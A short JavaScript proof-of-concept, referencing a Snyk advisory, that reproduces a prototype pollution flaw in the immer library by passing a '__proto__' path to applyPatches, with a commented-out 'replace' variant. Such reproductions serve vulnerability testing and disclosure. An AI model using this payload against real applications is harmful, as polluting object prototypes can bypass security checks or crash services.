//https://snyk.io/vuln/SNYK-JS-IMMER-1019369
const { applyPatches, enablePatches } = require("immer");
enablePatches();
applyPatches({}, [
  { op: "add", path: ["__proto__", "polluted"], value: "yes" },
]);

// applyPatches({}, [
//   { op: "replace", path: ["__proto__", "polluted"], value: "yes" },
// ]);
